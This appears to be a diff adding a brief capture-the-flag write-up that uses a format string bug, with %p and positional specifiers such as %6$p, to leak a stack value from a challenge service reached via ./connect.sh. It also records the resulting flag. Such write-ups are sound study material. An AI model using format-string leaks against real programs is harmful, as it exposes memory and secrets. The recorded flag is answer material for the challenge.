@@ -1,0 +1,19 @@
+since it mentioned format string attack
+we might be able to find something on the stack, and the code prints our input without any specification
+
+
+so in the code, we use %p to see what's on the stack
+
+and we can specify with %5$p to get only the data on the fifth location on the stack
+
+----------------------------------
+./connect.sh
+
+> %6$p
+> input what we get from the $6$p
+
+
+flag:d2b1dd0dc7b29ccfb612d9978d9f9ca4
+
+
+ 
